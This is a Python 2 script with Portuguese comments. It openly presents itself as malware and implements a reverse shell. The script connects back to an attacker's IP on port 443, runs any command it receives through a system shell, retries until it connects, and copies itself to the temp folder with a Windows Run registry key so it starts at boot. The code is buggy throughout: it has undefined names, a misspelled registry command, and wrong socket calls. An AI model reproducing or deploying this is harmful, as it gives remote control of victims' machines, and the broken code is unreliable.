# -*- coding: utf-8 -*-
import socket #para fazer a conexão TCP
import time #Para da um Delay
import subprocess #Para criar um processo em segundo plano
import tempfile  #Para criar um arquivo temporario 
import os #Para criar um arquivo temporario

#variaveis para 
ABERTO = True
S = None

#conexão TCP
IP="teu ip"
PORT=443 #porta que o malware vai se conectar com vc
filename="malwarepy.exe" #nome do malware em exe
tempdir=tempfile.gettempdir() #fazer diretorio temporario
diretorio=os.path.dirname(os.path.abspath(__file__)) #diretorio temporario

def autoRUN(): #função para iniciar junto com S.O 
	try:
		os.system("copy"+filename+" "+tempdir)
	except:
		print 'Erro Na Copia' #coloquei isso para fica mais didatico                                                                                                                                                                                                                                                                                                                                                                                      	pass
	try:
		FNULLL=open(os.devnull, 'w')
		subprocess.popen("REG AFD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" "/v NomeDoRegistro /d "+tempdir+"\\"+nome_arquivo,stdout=FNULL,Stderr=FNULL)
	except exception as e:
		print "erro de registro",e
def shell_reversa():
	try:
		s=socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(("MEU IP,PORTA"))
		s.send("[!]Conexão Recebida\n")
		return s
	except:
		return None
def Escutar():
	try:
		while True:
			data=s.recv(1024)
			if data [:-1] == "/exit":
				exit(s)
			else:
				cmd(s,data[:-1])
	except:
		main(s)
def exit(s):
	global ABERTO
	ABERTO= False
	try:
		s.send("[!] conexão encerrada")
		s.close
	except:
		main(s)
def cmd(s,data):
	try:
		proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		s.send("cmd"+data+"\n"+stdout_value)
	except:
		main(s)
def main(s):
	if s:
		s.close
	while ABERTO:
		s_aberto=shell_reversa()
		if s_aberto:
				escutar(s_aberto)
		else:
			time.sleep(10)
			print"tentando se conectar [!]"
			continue
	if diretorio.lower() != tempdir.lower():
		autoRUN()
main(S)
